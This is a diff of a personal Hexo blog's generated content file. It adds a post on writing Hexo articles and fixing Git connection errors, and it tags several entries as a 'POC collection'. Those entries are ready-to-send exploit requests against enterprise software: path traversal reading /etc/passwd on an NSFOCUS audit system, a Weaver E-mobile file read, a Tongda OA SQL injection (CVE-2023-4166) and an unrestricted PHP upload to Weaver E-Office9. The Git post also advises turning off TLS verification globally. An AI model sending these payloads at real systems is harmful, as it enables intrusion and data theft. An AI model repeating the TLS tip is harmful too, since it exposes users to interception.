@@ -4,12 +4,45 @@
   
   
   <entry>
+    <title>个人博客写文章以及Git报错解决</title>
+    <link href="/2023/08/10/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"/>
+    <url>/2023/08/10/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/</url>
+    
+    <content type="html"><![CDATA[<h3 id="用Hexo写博客"><a href="#用Hexo写博客" class="headerlink" title="用Hexo写博客"></a>用Hexo写博客</h3><p>使用终端在命令行里创建一篇博客，然后会在目录<code>/source/_posts</code>下生成一个Markdown文档</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo new post blog_name<br></code></pre></td></tr></table></figure><p><img src="/2023/08/10/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-50-25.png"></p><p><img src="/2023/08/10/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E5%86%99%E6%96%87%E7%AB%A0%E4%BB%A5%E5%8F%8AGit%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/Snipaste_2023-08-10_09-54-25.png"></p><p>现在开始编辑</p><h4 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h4><p>打开需要添加分类的文章，为其添加categories属性。下方的<code>categories: web前端</code>表示添加这篇文章到“web前端”这个分类。注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">个人博客写文章以及Git报错解决</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-08-10 09:46:40</span><br><span class="hljs-attr">categories:</span> <span class="hljs-string">Github个人博客搭建和使用</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的“分类”中。</p><h4 id="给文章添加“tags”属性"><a href="#给文章添加“tags”属性" class="headerlink" title="给文章添加“tags”属性"></a>给文章添加“tags”属性</h4><p>打开需要添加标签的文章，为其添加tags属性。下方的<code>tags:</code>下方的<code>- jQuery</code> <code>- 表格</code><br><code>- 表单验证</code>就是这篇文章的标签了</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">title: 个人博客写文章以及Git报错解决<br>date: 2023<span class="hljs-string">-08</span><span class="hljs-string">-10</span> 09:46:40<br>categories: Github个人博客搭建和使用<br><span class="hljs-keyword">tags:</span> [Github,博客搭建]<br></code></pre></td></tr></table></figure><p>至此，成功给文章添加分类，点击首页的“标签”可以看到该标签下的所有文章。当然，只有添加了<code>tags: xxx</code>的文章才会被收录到首页的“标签”中。</p><h3 id="git提交文章报错"><a href="#git提交文章报错" class="headerlink" title="git提交文章报错"></a>git提交文章报错</h3><h4 id="OpenSSL-SSL-read-Connection-was-reset-errno-10054"><a href="#OpenSSL-SSL-read-Connection-was-reset-errno-10054" class="headerlink" title="OpenSSL SSL_read: Connection was reset, errno 10054"></a>OpenSSL SSL_read: Connection was reset, errno 10054</h4><p>在文件里<code>git bash here</code>，设置后关闭当前terminal窗口，重新打开再执行git操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.sslVerify &quot;false&quot; <br></code></pre></td></tr></table></figure><h4 id="Failed-to-connect-to-github-com-port-443-Operation-timed-out"><a href="#Failed-to-connect-to-github-com-port-443-Operation-timed-out" class="headerlink" title="Failed to connect to github.com port 443:Operation timed out"></a>Failed to connect to github.com port 443:Operation timed out</h4><p>​首先，你有全局的科学上网小猫猫，然后在git里执行更换代理即可，注意使用V2ray的默认端口是1080。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git config --global http.proxy http://127.0.0.1:7890 <br>git config --global https.proxy http://127.0.0.1:7890<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github个人博客搭建和使用</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Github</tag>
+      
+      <tag>博客搭建</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>绿盟设备漏洞</title>
     <link href="/2023/08/10/%E7%BB%BF%E7%9B%9F%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/08/10/%E7%BB%BF%E7%9B%9F%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/</url>
     
     <content type="html"><![CDATA[<h3 id="绿盟sas安全审计系统任意文件读取漏洞"><a href="#绿盟sas安全审计系统任意文件读取漏洞" class="headerlink" title="绿盟sas安全审计系统任意文件读取漏洞"></a>绿盟sas安全审计系统任意文件读取漏洞</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/webconf/GetFile/indexpath=../../../../../../../../../../../../../../etc/passwd<br></code></pre></td></tr></table></figure>]]></content>
     
+    
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
     
     
     <tags>
@@ -32,6 +65,12 @@
     <content type="html"><![CDATA[<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a><strong>POC</strong></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>URL<span class="hljs-regexp">/E-mobile/</span>App<span class="hljs-regexp">/Init.php?weiApi=1&amp;sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&amp;m=12344554_../</span>..<span class="hljs-regexp">/attachment/</span>xxx.xls<br></code></pre></td></tr></table></figure>]]></content>
     
     
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
+    
     
     <tags>
       
@@ -53,6 +92,12 @@
     <content type="html"><![CDATA[<h2 id="通达OA（CVE-2023-4166）"><a href="#通达OA（CVE-2023-4166）" class="headerlink" title="通达OA（CVE-2023-4166）"></a>通达OA（CVE-2023-4166）</h2><h3 id="描述-影响范围"><a href="#描述-影响范围" class="headerlink" title="描述-影响范围"></a><strong>描述-影响范围</strong></h3><p>通达OA</p><p>是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是适合各个行业用户的综合管理办公平台</p><p>本次范围：通达OA版本11.10之前</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a><strong>POC</strong></h3><p>请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.137:8098<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=1u7tsd1cpgp9qvco726smb50h5; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=779f3f46<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure>]]></content>
     
     
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
+    
     
     <tags>
       
@@ -73,6 +118,12 @@
     
     <content type="html"><![CDATA[<h2 id="泛微-OA-代码执行-EXP"><a href="#泛微-OA-代码执行-EXP" class="headerlink" title="泛微 OA 代码执行 EXP"></a>泛微 OA 代码执行 EXP</h2><h3 id="描述和影响范围"><a href="#描述和影响范围" class="headerlink" title="描述和影响范围"></a><strong>描述和影响范围</strong></h3><p>Weaver E-Office9版本存在代码问题漏洞，该漏洞源于文件&#x2F;inc&#x2F;jquery&#x2F;uploadify&#x2F;uploadify.php存在问题，对参数Filedata的操作会导致不受限制的上传。</p><p>Weaver E-Office9.0</p><h3 id="POC-or-EXP"><a href="#POC-or-EXP" class="headerlink" title="POC or EXP"></a><strong>POC or EXP</strong></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/inc/jquery/uploadify/uploadify.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.232.137:8082<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>test<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>493<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85<br><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;Filedata&quot;</span>; filename=<span class="hljs-string">&quot;666.php&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;&quot;</span></span><br><span class="language-php">Content-Type: application/octet-stream</span><br><span class="language-php"></span><br><span class="language-php">--<span class="hljs-number">25</span>d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--</span><br></code></pre></td></tr></table></figure>]]></content>
     
+    
+    <categories>
+      
+      <category>POC收集</category>
+      
+    </categories>
     
     
     <tags>
